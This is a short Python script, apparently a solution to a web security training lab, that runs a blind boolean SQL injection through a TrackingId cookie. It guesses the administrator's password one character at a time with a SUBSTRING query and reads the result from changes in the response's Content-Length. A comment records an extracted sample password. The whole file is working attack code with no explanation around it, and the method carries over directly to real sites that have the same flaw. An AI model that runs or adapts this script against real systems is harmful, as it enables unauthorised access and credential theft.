import requests
import string
url = "https://abc.web-security-academy.net/"

s = requests.Session()
dummp_cookie = "KdFdid7YR4ujQBI4"
numbers = [1,2,3,4,5,6,7,8,9,0]
alphabets = list(string.ascii_letters)+numbers
extractedpassword = []
for x in range(1,22):
    for alpha in alphabets:
        ck  = {
        "TrackingId":dummp_cookie + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {}, 1) = '{}".format(x,alpha)
        }
        req = s.get(url=url,cookies=ck)
        ct_len = req.headers
        l = ct_len["Content-Length"]
        if (l != '1716'):
            extractedpassword.append(alpha)
            print(ck,l)
            break
#req = s.get(url=url,cookies=ck)

#print(s.headers)
#print(req.headers)
#print(req.text)
#extracted sample password --> v8lthsfxguakabans
print(extractedpassword)
print(''.join(extractedpassword))
s.close()
